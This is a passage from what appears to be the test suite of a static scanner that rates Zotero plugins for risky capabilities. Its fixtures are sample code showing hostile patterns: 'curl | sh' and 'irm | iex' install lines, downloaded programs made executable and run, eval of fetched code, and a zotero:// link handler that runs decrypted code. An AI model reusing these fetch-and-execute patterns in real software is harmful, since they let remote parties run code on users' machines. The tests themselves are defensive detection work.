    expect(capIn(r, "disables-security")?.details?.apis).toEqual([
      "security.disallow_privileged_https_script_loads",
    ]);
    expect(r.card.label).toBe("high-concern");
    const prefs = await scanFiles({ "prefs.js": `pref("xpinstall.signatures.required", false);` });
    expect(capIn(prefs, "disables-security")).toBeDefined();
    const read = await scanFiles({
      "content/a.js": `Services.prefs.getBoolPref("security.disallow_privileged_https_script_loads");`,
    });
    expect(capIn(read, "disables-security")).toBeUndefined();
  });

  it("flags a script element the plugin injects from the web", async () => {
    const r = await scanFiles({
      "content/a.js":
        'const s = doc.createElement("script"); s.src = "https://unpkg.com/leaflet/dist/leaflet.js"; doc.head.append(s);',
    });
    expect(capIn(r, "remote-script")).toBeDefined();
  });

  it("notes, at low concern, web scripts in pages the plugin writes out (zotero-ocr)", async () => {
    const r = await scanFiles({
      "content/ocr.js":
        'const html = `<html><head><script src="https://unpkg.com/hocrjs"></script></head>`; await IOUtils.writeUTF8(path, html);',
    });
    expect(capIn(r, "remote-script-output")).toBeDefined();
    expect(r.card.capabilities.find((c) => c.id === "remote-script-output")?.concern).toBe("low");
  });

  it("sees loadSubScript and import() of an address held in a variable", async () => {
    const r = await scanFiles({
      "content/a.js":
        'const u = "https://raw.githubusercontent.com/x/y/main/dict.js"; Services.scriptloader.loadSubScript(u, ctx);',
    });
    expect(capIn(r, "remote-code")).toBeDefined();
    expect(r.card.label).toBe("high-concern");
  });
});

describe("new capability types", () => {
  it("finds a plugin that installs other add-ons (zotero-addons), not the toolkit's unused copy", async () => {
    const own = await scanFiles({
      "content/a.js":
        "const install = await AddonManager.getInstallForURL(xpiUrl); install.install();",
    });
    expect(capIn(own, "installs-addons")).toBeDefined();
    const toolkit = await scanFiles({
      "content/index.js":
        "// node_modules/zotero-plugin-toolkit/dist/index.js\nfunction i(u) { return AddonManager.getInstallForURL(u); }\n// src/index.ts\nZotero.debug(1);",
    });
    expect(capIn(toolkit, "installs-addons")).toBeUndefined();
    const minified = await scanFiles({
      "content/a.js":
        "async function r(e,i){if(!ok)throw new Error(`Requires Zotero version between ${i.minVersion} and ${i.maxVersion}.`);let a=await e.getInstallForURL(i.url);a.install()}",
    });
    expect(capIn(minified, "installs-addons")).toBeUndefined();
  });

  it("finds a download that is made executable and run (zotero-kindle-sync)", async () => {
    const r = await scanFiles({
      "content/a.js": `
        await Zotero.HTTP.download(url, zipPath);
        await Subprocess.call({ command: "/bin/chmod", arguments: ["755", bin] });
        await Subprocess.call({ command: bin, arguments: ["sync"] });`,
    });
    expect(capIn(r, "download-exec")).toBeDefined();
    expect(r.card.label).toBe("high-concern");
  });

  it("finds sign-in with another app's client ID", async () => {
    const r = await scanFiles({
      "content/a.js":
        'const CLIENT_ID = "app_EMoamEEZ73f0CkXaXp7hrann"; fetch("https://auth.openai.com/oauth/token", { method: "POST" });',
    });
    expect(capIn(r, "borrowed-identity")?.details?.apis).toEqual(["Codex CLI"]);
    expect(r.card.label).toBe("review-details");
  });
});

describe("audit fixes", () => {
  it("doesn't take a Referer header for a destination", async () => {
    const r = await scanFiles({
      "content/a.js":
        'fetch(api + "/search", { headers: { Referer: "https://www.semanticscholar.org/" } });',
    });
    expect(hostIn(r, "www.semanticscholar.org")?.usage).not.toBe("request");
  });

  it("calls eval remote code only when it runs a network response", async () => {
    const local = await scanFiles({ "content/a.js": "const text = template(); eval(text);" });
    expect(capIn(local, "remote-code")).toBeUndefined();
    const remote = await scanFiles({
      "content/a.js":
        "async function upd() { const r = await fetch(u); const s = await r.text(); (0, eval)(s); }",
    });
    expect(capIn(remote, "remote-code")).toBeDefined();
    const sandbox = await scanFiles({
      "content/a.js":
        "const res = await Zotero.HTTP.request('GET', u); Cu.evalInSandbox(res.responseText, sb);",
    });
    expect(capIn(sandbox, "remote-code")).toBeDefined();
  });

  it("counts sqlite-direct only when the open points at zotero.sqlite", async () => {
    const other = await scanFiles({
      "content/a.js": `
        const help = "Don't edit zotero.sqlite by hand";
        const conn = Services.storage.openDatabase(FileUtils.getFile("ProfD", ["myplugin.sqlite"]));`,
    });
    expect(capIn(other, "sqlite-direct")).toBeUndefined();
    const zotero = await scanFiles({
      "content/a.js": `
        const path = PathUtils.join(Zotero.DataDirectory.dir, "zotero.sqlite");
        const conn = Services.storage.openUnsharedDatabase(new FileUtils.File(path));`,
    });
    expect(capIn(zotero, "sqlite-direct")).toBeDefined();
  });

  it("marks shadow-library destinations for a legal notice", async () => {
    const r = await scanFiles({ "content/a.js": 'fetch("https://sci-hub.se/" + doi);' });
    expect(r.card.legalRisk).toBe(true);
  });
});

describe("where updates come from", () => {
  const projects = new Map([
    [
      "windingwind/zotero-pdf-translate",
      { slug: "zotero-pdf-translate", name: "Translate for Zotero" },
    ],
  ]);
  const own = {
    repo: "someone/zotero-pdf-translate-z6",
    addonIdSharedWith: ["zotero-pdf-translate"],
  };
  const kind = (url: string | null, o = own) => classifyUpdateSource(url, o, projects);

  it("recognises this project's own release or raw update file", () => {
    expect(
      kind(
        "https://github.com/someone/zotero-pdf-translate-z6/releases/download/release/update.json",
      ).kind,
    ).toBe("this-project");
    expect(
      kind("https://raw.githubusercontent.com/someone/zotero-pdf-translate-z6/main/update.json")
        .kind,
    ).toBe("this-project");
  });

  it("says when updates come from another listed project (a fork updating from the original)", () => {
    const u = kind(
      "https://github.com/windingwind/zotero-pdf-translate/releases/download/release/update.json",
    );
    expect(u.kind).toBe("other-listed-project");
    // By repository: a fork's listing often has the same title as the original's.
    expect(u.label).toBe(
      "Updates come from windingwind/zotero-pdf-translate, another listed project with the same add-on ID",
    );
  });

  it("treats loopback, private and sample-plugin update addresses as placeholders", () => {
    expect(kind("https://127.0.0.1:65535/markdown-pdf-link/updates.json").kind).toBe("none");
    expect(kind("https://updates.myplugin.lan/update.json").kind).toBe("none");
    const sample = kind("https://zotero-download.s3.amazonaws.com/tmp/make-it-red/updates.json");
    expect(sample.label).toContain("Zotero's sample plugin");
    expect(kind("https://github.com/owner/repo/blob/main/update.json").label).toContain("web page");
  });

  it("names repositories we don't analyse (zotero-reference updates from Gitee)", () => {
    const u = kind("https://gitee.com/MuiseDestiny/plugins/raw/main/zotero-reference/update.json");
    expect(u.kind).toBe("other-repository");
    expect(u.repo).toBe("MuiseDestiny/plugins");
  });

  it("flags template namespaces anyone could claim, but not reserved placeholders", () => {
    expect(
      kind("https://github.com/yourusername/zotero-gemini/releases/download/v1/update.json").kind,
    ).toBe("unclaimed-namespace");
    expect(kind("https://your-update-url.com/update.json").kind).toBe("unclaimed-namespace");
    expect(kind("https://example.com/update.json").kind).toBe("none");
    expect(kind("__updaterdf__").kind).toBe("none");
    expect(kind(null).label).toBe("Doesn't update automatically");
  });

  it("reads Gitee raw addresses and treats zotero.org sample addresses as no updates", () => {
    expect(
      kind("https://raw.giteeusercontent.com/MuiseDestiny/plugins/raw/master/update.json").repo,
    ).toBe("MuiseDestiny/plugins");
    expect(kind("https://www.zotero.org/download/plugins/make-it-red/updates.json").kind).toBe(
      "none",
    );
  });

  it("treats a repo page instead of an update file as no updates", () => {
    expect(kind("https://github.com/someone/zotero-pdf-translate-z6").kind).toBe("none");
  });
});

describe("card review, 2026-09-26", () => {
  const handler = (name: string, body: string) =>
    `function init_${name.replace(/\W/g, "_")}() {
       const ext = { noContent: true, doAction: async (uri) => { const params = parse(uri.spec); ${body} }, newChannel(uri) { this.doAction(uri); } };
       Services.io.getProtocolHandler("zotero").wrappedJSObject._extensions["zotero://${name}"] = ext;
     }`;

  it("rates a zotero:// link that runs code without asking as remote code (zotero-gpt)", async () => {
    const r = await scanFiles({
      "content/a.js": handler(
        "meet-awesome-gpt",
        `const s = await this.decryptCode(params.iv, params.data);
         const c = Object.getPrototypeOf(async () => {}).constructor; await new c("Zotero", s)(Zotero);`,
      ),
    });
    expect(capIn(r, "link-runs-code")?.details?.asksFirst).toBe(false);
    expect(r.card.label).toBe("high-concern");
  });

  it("rates a link handler that asks first, and one that installs add-ons, for review (zotero-plugin-toolkit)", async () => {
    const r = await scanFiles({
      "content/a.js": `${handler(
        "ztoolkit-debug",
        `if (window.confirm("Run " + params.run + "?")) { const F = Object.getPrototypeOf(async () => {}).constructor; await new F("Zotero", params.run)(Zotero); }`,
      )}
      ${handler("plugin", `const a = await AddonManager.getInstallForURL(params.url); a.install();`)}`,
    });
    expect(capIn(r, "link-runs-code")?.details?.asksFirst).toBe(true);
    expect(capIn(r, "link-installs-addons")).toBeDefined();
    expect(r.card.label).toBe("review-details");
  });

  it("finds code shipped encrypted, decrypted and run (pro-entry.enc)", async () => {
    const blob = `{"algorithm":"AES-256-GCM","ciphertext":"${"QUJD".repeat(3000)}"}`;
    const r = await scanFiles({
      "content/pro/entry.enc": blob,
      "content/a.js": `const buf = await (await fetch(rootURI + "content/pro/entry.enc")).text();
        const plain = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, data);
        new Function(new TextDecoder().decode(plain))();`,
    });
    expect(capIn(r, "encrypted-code")).toBeDefined();
    expect(r.card.label).toBe("high-concern");
    const plain = await scanFiles({
      "content/data/words.txt": "word ".repeat(4000),
      "content/a.js": `const words = await (await fetch(rootURI + "content/data/words.txt")).text(); new Function(src)();`,
    });
    expect(capIn(plain, "encrypted-code")).toBeUndefined();
  });

  it("finds a program downloaded by fetch and written to disk (zotero-copy-anything)", async () => {
    const r = await scanFiles({
      "content/a.js": `function info() { return Zotero.isWin ? "https://gitee.com/x/y/releases/download/binary/copyfiles.exe" : "https://gitee.com/x/y/releases/download/binary/copyfiles-mac"; }
        async function get(url, path) { const res = await fetch(url); const buf = await res.arrayBuffer(); await IOUtils.write(path, new Uint8Array(buf));
          await Subprocess.call({ command: "/bin/chmod", arguments: ["777", path] }); }
        async function run(path) { await Subprocess.call({ command: path, arguments: [] }); }`,
    });
    expect(capIn(r, "download-exec")).toBeDefined();
  });

  it("finds Firefox's download manager, a 0o100755 mode and nsIProcess (zotfile)", async () => {
    const r = await scanFiles({
      "content/a.js": `var url = base + name + ".zip";
        Downloads.createDownload({ source: url, target: file }).then((d) => d.start().then(() => {
          var proc = Components.classes["@mozilla.org/process/util;1"].createInstance(Components.interfaces.nsIProcess);
          proc.init(Zotero.File.pathToFile("/usr/bin/unzip")); proc.runw(true, args, args.length);
          extractor.permissions = 33261; }));`,
    });
    expect(capIn(r, "download-exec")).toBeDefined();
  });

  it("finds install scripts that pipe a download into a shell (jadense, aidea)", async () => {
    const r = await scanFiles({
      "scripts/install.sh": "#!/bin/sh\ncurl -LsSf https://astral.sh/uv/install.sh | sh\n",
      "content/a.js": `Subprocess.call({ command: "/bin/sh", arguments: [rootPath + "/scripts/install.sh"] });`,
    });
    expect(capIn(r, "download-exec")).toBeDefined();
    const inline = await scanFiles({
      "content/a.js": `const cmd = "irm https://example.org/install.ps1 | iex"; Subprocess.call({ command: "powershell", arguments: ["-c", cmd] });`,
    });
    expect(capIn(inline, "download-exec")).toBeDefined();
    const docs = await scanFiles({
      "content/a.js": `const help = "Install with: curl -fsSL https://example.org/i.sh | sh";`,
    });
    expect(capIn(docs, "download-exec")).toBeUndefined();
  });

  it("doesn't count commands it only shows (zotero-babeldoc, zotero-ai-explain, ai4paper)", async () => {
    const launch = `Subprocess.call({ command: babeldocPath, arguments: ["--version"] });`;
    // In an error message, and with no shell to run a command line in.
    const babeldoc = await scanFiles({
      "content/a.js": `function installCommand() { return "curl -LsSf https://astral.sh/uv/install.sh | sh && uv pip install BabelDOC"; }
        if (!found) throw new Error("Not found. Run outside Zotero: " + installCommand()); ${launch}`,
    });
    expect(capIn(babeldoc, "download-exec")).toBeUndefined();
    expect(capIn(babeldoc, "package-run")).toBeUndefined();
    // A Copy button's code block, even when the plugin does start a shell elsewhere.
    const explain = await scanFiles({
      "content/a.js": `panel.append(makeCodeBlock("install", "curl -fsSL https://ollama.com/install.sh | sh"));
        Subprocess.call({ command: "/bin/sh", arguments: ["-c", "node server.mjs"] });`,
    });
    expect(capIn(explain, "download-exec")).toBeUndefined();
    // An MCP config it shows for Claude Desktop's settings.
    const ai4paper = await scanFiles({
      "content/a.js": `const cfg = { mcpServers: { zotero: { command: "npx", args: ["-y", "mcp-remote", url] } } }; ${launch}`,
    });
    expect(capIn(ai4paper, "package-run")).toBeUndefined();
    // Returned by a helper whose result is only put on screen; `-c` is BabelDOC's config flag.
    const helper = await scanFiles({
      "content/a.js": `function getUnixInstallCommand() { return ["curl -LsSf https://astral.sh/uv/install.sh | sh", "uv pip install BabelDOC"].join("\\n"); }
        function getInstallCommand() { return isWin ? other() : getUnixInstallCommand(); }
        box.textContent = getUnixInstallCommand();
        if (!found) throw new Error(\`Run outside Zotero: \${getInstallCommand()}\`);
        runExternalProcess(babeldoc.path, ["-c", configPath, "--files", input]);`,
    });
    expect(capIn(helper, "download-exec")).toBeUndefined();
    expect(capIn(helper, "package-run")).toBeUndefined();
  });

  it("finds package installs run through a path variable or a shipped script (iris, jadense)", async () => {
    const iris = await scanFiles({
      "content/a.js": `const r = await runExecutableCommand(npmState.npmPath, ["install", "-g", targetPackage]); Subprocess.call({ command: p, arguments: [] });`,
    });
    expect(capIn(iris, "package-run")).toBeDefined();
    const jadense = await scanFiles({
      "content/install.sh": `#!/bin/sh\n# uv sync installs the locked packages\nrun_child "$uv_path" sync --project "$runtime" --frozen\n`,
      "content/a.js": `Subprocess.call({ command: "/bin/sh", arguments: [root + "content/install.sh"] });`,
    });
    expect(capIn(jadense, "package-run")).toBeDefined();
    const echoed = await scanFiles({
      "content/install.sh": `#!/bin/sh\necho "Then run: pip install foo"\n`,
      "content/a.js": `Subprocess.call({ command: "/bin/sh", arguments: [root + "content/install.sh"] });`,
    });
    expect(capIn(echoed, "package-run")).toBeUndefined();
  });

  it("counts Zotero's web API client as a request and its own package reads as no file access", async () => {
    const api = await scanFiles({
      "content/a.js": `const apiKey = await Zotero.Sync.Data.Local.getAPIKey();
        const client = Zotero.Sync.Runner.getAPIClient({ apiKey }); await client.getReadAloudVoices();`,
    });
    expect(hostIn(api, "api.zotero.org")?.usage).toBe("request");
    expect(capIn(api, "login-manager")).toBeDefined();
    const own = await scanFiles({
      "bootstrap.js": `var csl = Zotero.File.getContentsFromURL(this._rootURI + "csl/apa.csl"); Zotero.Styles.install({ string: csl }, "apa.csl", true);`,
    });
    expect(capIn(own, "filesystem")).toBeUndefined();
    const user = await scanFiles({
      "bootstrap.js": `await Zotero.File.putContentsAsync(path, text);`,
    });
    expect(capIn(user, "filesystem")).toBeDefined();
  });

  it("follows an address passed into a request helper (zotero-agent--auince, zot-anlp)", async () => {
    const method = await scanFiles({
      "content/a.js": `class P { async publicRequest(url) { return Zotero.HTTP.request("GET", url); }
        async search(q) { return this.publicRequest(\`https://api.skillmd-fixture.com/v1/search?q=\${q}\`); } }`,
    });
    expect(hostIn(method, "api.skillmd-fixture.com")?.usage).toBe("request");
    const viaVar = await scanFiles({
      "content/a.js": `async function fetchText(url) { const r = await fetch(url); return r.text(); }
        async function load(id) { const url = \`https://www.anlp-fixture.jp/proceedings/\${id}\`; return fetchText(url); }`,
    });
    expect(hostIn(viaVar, "www.anlp-fixture.jp")?.usage).toBe("request");
  });

  it("skips entries of an array read only at other indexes (zotero-gpt forks)", async () => {
    const r = await scanFiles({
      "content/a.js": `const $Q = [{ api: "https://aigpt-fixture.one/api" }, { api: "https://chatbot.theb-fixture.ai/api" }];
        async function ask(t) { const c = $Q[1]; return Zotero.HTTP.request("POST", c.api, { body: t }); }
        function other() { return $Q[1].api; }`,
    });
    expect(hostIn(r, "aigpt-fixture.one")).toBeUndefined();
    expect(hostIn(r, "chatbot.theb-fixture.ai")).toBeDefined();
  });

  it("treats addresses only opened in the browser as links, even through a helper", async () => {
    const r = await scanFiles({
      "content/a.js": `const chromeDownloadUrl = "https://www.chrome-fixture.com/chrome/";
        function openExternalUrl(url) { Zotero.launchURL(url); }
        openExternalUrl("https://docs.helper-fixture.org/setup");
        Zotero.launchURL(missing ? "https://edge-fixture.example.org/x" : chromeDownloadUrl);
        fetch(api);`,
    });
    expect(hostIn(r, "www.chrome-fixture.com")?.usage).toBe("link");
    expect(hostIn(r, "docs.helper-fixture.org")?.usage).toBe("link");
  });

  it("doesn't take a same-named variable in another function for a request's address", async () => {
    const r = await scanFiles({
      "content/a.js": `function help() { const url = "https://docs.help-fixture.org/guide"; Zotero.launchURL(url); }
        async function get(url) { return fetch(url); }`,
    });
    expect(hostIn(r, "docs.help-fixture.org")?.usage).not.toBe("request");
    const shared = await scanFiles({
      "content/a.js": `const url = "https://api.shared-fixture.org/v1"; async function get() { return fetch(url); }`,
    });
    expect(hostIn(shared, "api.shared-fixture.org")?.usage).toBe("request");
  });

  it("follows a script address a helper returns through a variable (zotero-odh)", async () => {
    const r = await scanFiles({
      "content/a.js": `class A { async loadScript(name) { Services.scriptloader.loadSubScript(this.buildScriptURL(name), g); }
        buildScriptURL(name2) { const gitbase = "https://raw.githubusercontent.com/ninja33/ODH/master/src/dict/"; let url = name2;
          if (url.indexOf("://") == -1) { url = rootURI + "/dict/" + url; } else { url = url.indexOf("lib://") != -1 ? gitbase + url.replace("lib://", "") : url; }
          return url; } }`,
    });
    expect(capIn(r, "remote-code")).toBeDefined();
    expect(r.card.label).toBe("high-concern");
  });

  it("finds webhooks into a fixed account, Zotero's server opened to the network, and path helpers", async () => {
    const hook = await scanFiles({
      "content/a.js": `var url = 'https://flomoapp.com/iwh/OTcyMDYw/414d91d69c76016b4267c4adaeb18170/'; fetch(url, { method: 'POST', body });`,
    });
    expect(hook.card.dataSharing).toBe("developer-servers");
    const opds = await scanFiles({
      "content/a.js": `Zotero.Server.init = (function (original) { return function (port, bindAllAddr, max) { return original.apply(this, [port, true, max]); }; })(Zotero.Server.init);`,
    });
    expect(opds.card.capabilities).toContainEqual({ id: "own-server", concern: "medium" });
    const paths = await scanFiles({
      "content/a.js": `const dir = PathUtils.parent(item.getFilePath()); const uri = Zotero.File.pathToFileURI(dir);`,
    });
    expect(capIn(paths, "filesystem")).toBeUndefined();
  });

  it("says when it turns on Zotero's local API (zotero-codex)", async () => {
    const r = await scanFiles({
      "content/a.js": `Zotero.Prefs.set("httpServer.localAPI.enabled", true);`,
    });
    expect(r.card.capabilities).toContainEqual({ id: "enables-local-api", concern: "low" });
    const reads = await scanFiles({
      "content/a.js": `const on = Zotero.Prefs.get("httpServer.localAPI.enabled");`,
    });
    expect(capIn(reads, "enables-local-api")).toBeUndefined();
  });

  it("rates a shipped script's download pinned to a SHA-256 as pinned (codex-bilingual-reader)", async () => {
    const r = await scanFiles({
      "runtime/install.ps1": `$engineSha256 = "${"a".repeat(64)}"
        Invoke-WebRequest -Uri $engineUrl -OutFile $zip
        if ((Get-FileHash $zip -Algorithm SHA256).Hash -ne $engineSha256) { throw "mismatch" }
        Expand-Archive $zip -DestinationPath $dir`,
      "content/a.js": `Subprocess.call({ command: "powershell.exe", arguments: ["-File", rootPath + "/runtime/install.ps1"] });`,
    });
    expect(capIn(r, "download-exec")?.details?.apis).toEqual(["pinned to a SHA-256"]);
    expect(r.card.label).toBe("review-details");
  });

  it("doesn't count an XMLHttpRequest that only reads the plugin's own files (zotero-ner)", async () => {
    const r = await scanFiles({
      "bootstrap.js": `function readTextFromURI(uri) { const x = new XMLHttpRequest(); x.open("GET", uri, false); x.send(null); return x.responseText; }
        function readStyle(uri, root) { return readTextFromURI(uri); }
        function startup(data) { const css = readStyle(\`\${data.rootURI}styles/a.css\`, data.rootURI); }`,
    });
    expect(r.card.dataSharing).toBe("no-network-found");
    const remote = await scanFiles({
      "bootstrap.js": `const x = new XMLHttpRequest(); x.open("GET", url, true); x.send();`,
    });
    expect(remote.analysis.network.apis.map((a) => a.api)).toContain("xhr");
  });

  it("follows a helper's parameter to what its callers pass, not a method of the same name", async () => {
    const r = await scanFiles({
      "content/a.js": `class Toolkit { getIcon(type, fallback) { return icons[type] ?? fallback; } create(o) { return this.getIcon(o.type, o.icon); } }
        function getIcon(src) { return Zotero.HTTP.request("GET", src, {}); }
        getIcon("chrome://plugin/content/icons/a.svg"); getIcon(\`chrome://plugin/content/icons/\${n}.svg\`);`,
    });
    expect(r.card.dataSharing).toBe("no-network-found");
  });

  it("keeps each scope's bindings in a minified file that reuses one name thousands of times", async () => {
    const noise = Array.from(
      { length: 120 },
      (_, i) => `function f${i}(){let t=${i};return t}`,
    ).join(";");
    const r = await scanFiles({
      "content/a.js": `${noise};function g(){let t={noContent:!0,doAction:async n=>{const F=Object.getPrototypeOf(async()=>{}).constructor;await new F("Zotero",n.spec)(Zotero)}};Services.io.getProtocolHandler("zotero").wrappedJSObject._extensions["zotero://run"]=t}`,
    });
    expect(capIn(r, "link-runs-code")).toBeDefined();
  });
});

describe("card review, 2026-09-26 (continued)", () => {
  const exe = () => {
    const b = new Uint8Array(2048);
    b[0] = 0x4d;
    b[1] = 0x5a; // "MZ": a Windows program
    return b;
  };

  it("finds a compiled program it ships and runs (zotero-pdf-outline-builder, zotlook)", async () => {
    const r = await scanFiles({
      "bin/helper.exe": exe(),
      "content/a.js": `const p = rootPath + "/bin/helper.exe"; Subprocess.call({ command: p, arguments: [] });`,
    });
    expect(capIn(r, "runs-bundled-binary")?.details?.apis).toEqual(["bin/helper.exe"]);
    const unused = await scanFiles({ "bin/helper.exe": exe(), "content/a.js": `const x = 1;` });
    expect(capIn(unused, "runs-bundled-binary")).toBeUndefined();
  });

  it("finds packages installed or run at run time (npx, pip, uv)", async () => {
    const r = await scanFiles({
      "content/a.js": `Subprocess.call({ command: "npx", arguments: ["-y", "@agentclientprotocol/codex-acp@latest"] });`,
    });
    expect(capIn(r, "package-run")).toBeDefined();
    // @latest: whatever the registry serves that day.
    expect(r.card.label).toBe("high-concern");
    const pinned = await scanFiles({
      "content/a.js": `Subprocess.call({ command: "npx", arguments: ["-y", "@agentclientprotocol/codex-acp@1.6.2"] });`,
    });
    expect(pinned.card.label).toBe("review-details");
  });

  it("finds a package tool whose arguments are kept apart (zotero-gemini-notebook)", async () => {
    const spec = `const spec = { command: "uv", args: ["--no-config", "run", "--isolated", "--locked", "--project", dir, "python", path] };`;
    const r = await scanFiles({
      "content/a.js": `${spec} Subprocess.call({ command: spec.command, arguments: spec.args });`,
    });
    expect(capIn(r, "package-run")?.details?.apis).toEqual(["uv run"]);
    // `git run` or a docker argument list doesn't count without the tool named as a command.
    const other = await scanFiles({
      "content/a.js": `Subprocess.call({ command: "docker", arguments: ["run", "--rm", "img"] }); const hint = "uv";`,
    });
    expect(capIn(other, "package-run")).toBeUndefined();
  });

  it("names the AI tools it hands data to (Claude Code, Codex)", async () => {
    const r = await scanFiles({
      "content/a.js": `Subprocess.call({ command: "claude", arguments: ["-p", prompt] });`,
    });
    expect(r.analysis.network.programs?.map((p) => p.program)).toEqual(["Claude Code"]);
    expect(r.card.dataSharing).toBe("named-third-parties");
    const docs = await scanFiles({ "content/a.js": `const hint = "claude";` });
    expect(docs.analysis.network.programs).toBeUndefined();
  });

  it("reads the addresses in a Python script it ships and runs", async () => {
    const r = await scanFiles({
      "py/ocr.py": 'import requests\nrequests.post("https://api.mistral.ai/v1/ocr", files=f)\n',
      "content/a.js": `Subprocess.call({ command: "python3", arguments: [dir + "/py/ocr.py"] });`,
    });
    expect(hostIn(r, "api.mistral.ai")?.usage).toBe("request");
  });

  it("treats a request to the item's own URL as a destination the user chose", async () => {
    const r = await scanFiles({
      "content/a.js": `const url = item.getField("url"); const res = await fetch(url, { method: "HEAD" });`,
    });
    expect(r.card.dataSharing).toBe("user-configured-only");
  });

  it("finds addresses hidden in base64 (zotero-style)", async () => {
    const r = await scanFiles({
      "content/a.js": `const u = "https://" + atob("YXBpLm11aXNlZGVzdGlueS54eXovY2hlY2s="); fetch(u);`,
    });
    expect(hostIn(r, "api.muisedestiny.xyz")).toBeDefined();
  });

  it("tells its own updater from installing other add-ons (paper-chat, Garden)", async () => {
    const self = await scanFiles({
      "content/a.js": `async function checkForUpdate() { const latestVersion = await getLatest(); const install = await AddonManager.getInstallForURL(latestVersion.url); install.install(); }`,
    });
    expect(capIn(self, "self-installs")).toBeDefined();
    expect(capIn(self, "installs-addons")).toBeUndefined();
    const other = await scanFiles({
      "content/a.js": `async function installAddonFromUrl(url) { const install = await AddonManager.getInstallForURL(url); install.install(); }`,
    });
    expect(capIn(other, "installs-addons")).toBeDefined();
  });

  it("tells its own server from a Zotero connector endpoint, and flags one open to the network", async () => {
    const own = await scanFiles({
      "content/a.js": `const s = Cc["@mozilla.org/network/server-socket;1"].createInstance(Ci.nsIServerSocket); s.init(23120, true, -1);`,
    });
    expect(capIn(own, "own-server")).toBeDefined();
    expect(own.card.label).toBe("low-concern");
    const open = await scanFiles({
      "content/a.js": `const s = Cc["@mozilla.org/network/server-socket;1"].createInstance(Ci.nsIServerSocket); s.init(23120, false, -1);`,
    });
    expect(open.card.capabilities).toContainEqual({ id: "own-server", concern: "medium" });
  });

  it("rates translators it downloads above translators it ships", async () => {
    const web = await scanFiles({
      "content/a.js": `const src = await (await fetch("https://raw.githubusercontent.com/x/translators_CN/master/translators/CNKI.js")).text();
        await Zotero.Translators.save(meta, src); await Zotero.Translators.reinit();`,
    });
    expect(web.card.capabilities).toContainEqual({ id: "installs-translators", concern: "medium" });
    const bundled = await scanFiles({
      "content/a.js": `const src = await Zotero.File.getContentsFromURLAsync(rootURI + "translators/Syllabus.js"); await Zotero.Translators.save(meta, src);`,
    });
    expect(bundled.card.capabilities).toContainEqual({
      id: "installs-translators",
      concern: "low",
    });
  });

  it("rates launching only the system's openers like Zotero.launchFile (zotlit, Quick Look)", async () => {
    const r = await scanFiles({
      "content/a.js": `Zotero.Utilities.Internal.exec("/usr/bin/open", ["obsidian://open?vault=x"]);
        Subprocess.call({ command: "/usr/bin/qlmanage", arguments: ["-p", path] });`,
    });
    expect(r.card.capabilities).toContainEqual({ id: "process-launch", concern: "low" });
    const mixed = await scanFiles({
      "content/a.js": `Zotero.Utilities.Internal.exec("/usr/bin/open", [p]); Subprocess.call({ command: "/usr/local/bin/pdftotext", arguments: [p] });`,
    });
    expect(mixed.card.capabilities).toContainEqual({ id: "process-launch", concern: "medium" });
  });

  it("keeps a readable bundle readable when it holds a long data line", async () => {
    const svg = `const ICON = "${"M10 10L20 20".repeat(900)}";`;
    const r = await scanFiles({
      "content/index.js": `${svg}\nfunction f(a) {\n  return a + 1;\n}\n`.repeat(2),
    });
    expect(r.analysis.transparency.verdict).toBe("readable");
    const min = await scanFiles({
      "content/index.js": Array.from(
        { length: 800 },
        (_, i) => `function f${i}(a){return a+${i}};`,
      ).join(""),
    });
    expect(min.analysis.transparency.verdict).toBe("minified");
  });
});

describe("card review, 2026-09-26 (precision)", () => {
  it("doesn't take a url: key elsewhere in the file for a request's destination", async () => {
    const r = await scanFiles({
      "content/a.js": `var pkg = { repository: { url: "https://github.com/someone/plugin" } };
        async function get(url) { return Zotero.HTTP.request("GET", url); }`,
    });
    expect(hostIn(r, "github.com")?.usage).not.toBe("request");
    const cfg = await scanFiles({
      "content/a.js": `const cfg = { url: "https://api.example-service.org/v1" }; fetch(cfg.url);`,
    });
    expect(hostIn(cfg, "api.example-service.org")?.usage).toBe("request");
  });

  it("doesn't take header values, display tables or dead branches for destinations", async () => {
    const r = await scanFiles({
      "content/a.js": `fetch(api, { headers: { Referer: "https://fanyi.dict.cn/" } });
        const CHANNELS = [{ name: "Taobao", icon: "tb.svg", url: "https://m.tb.cn/h.abc" }];
        async function get(o) { return fetch(o.url); }
        const base = false ? "http://127.0.0.1:8000" : "https://api.example-prod.org";
        fetch(base + "/v1");`,
    });
    expect(hostIn(r, "fanyi.dict.cn")?.usage).toBe("link");
    expect(hostIn(r, "m.tb.cn")?.usage).not.toBe("request");
    expect(hostIn(r, "127.0.0.1")).toBeUndefined();
  });

  it("treats <a href> inside a string of HTML as a link", async () => {
    const r = await scanFiles({
      "content/a.js":
        'const html = `DOI: <a href="https://doi.org/${doi}">${doi}</a>`; fetch(localUrl);',
    });
    expect(hostIn(r, "doi.org")?.usage).toBe("link");
  });

  it("skips CSL style IDs and ends URLs at CJK punctuation", async () => {
    const r = await scanFiles({
      "content/a.js": `const style = "http://www.zotero.org/styles/apa"; const tip = "请访问 https://api.jlss.vip。然后";`,
    });
    expect(hostIn(r, "www.zotero.org")).toBeUndefined();
    expect(hostIn(r, "api.jlss.vip")).toBeDefined();
  });

  it("names an AI tool only where it's run, not a model id", async () => {
    const model = await scanFiles({
      "content/a.js": `const providers = ["gemini", "claude", "qwen"]; Subprocess.call({ command: "/usr/bin/git", arguments: [] });`,
    });
    expect(model.analysis.network.programs).toBeUndefined();
    const run = await scanFiles({
      "content/a.js": `Subprocess.call({ command: "gemini", arguments: ["-p", q] });`,
    });
    expect(run.analysis.network.programs?.map((p) => p.program)).toEqual(["Gemini CLI"]);
  });

  it("doesn't count stream helpers or a fetch parameter as network use", async () => {
    const r = await scanFiles({
      "content/a.js": `const text = NetUtil.readInputStreamToString(stream, stream.available());
        async function cached(key, fetch) { return memo[key] ??= await fetch(); }`,
    });
    expect(r.analysis.network.apis).toEqual([]);
  });

  it("follows both branches of a conditional to the plugin's own files", async () => {
    const r = await scanFiles({
      "content/a.js": `const src = dev ? rootURI + "a.js" : "chrome://p/content/a.js"; const x = new XMLHttpRequest(); x.open("GET", src, false);`,
    });
    expect(r.card.dataSharing).toBe("no-network-found");
  });
});

describe("card review, 2026-09-26 (last verifications)", () => {
  it("counts Zotero's metadata recognizer as a lookup service", async () => {
    const r = await scanFiles({
      "content/a.js": `await Zotero.RecognizeDocument.recognizeItems([attachment]);`,
    });
    expect(r.analysis.network.apis.map((a) => a.api)).toContain("zotero-lookup");
  });

  it("reads an Access-Control-Allow-Origin header written as an object key", async () => {
    const r = await scanFiles({
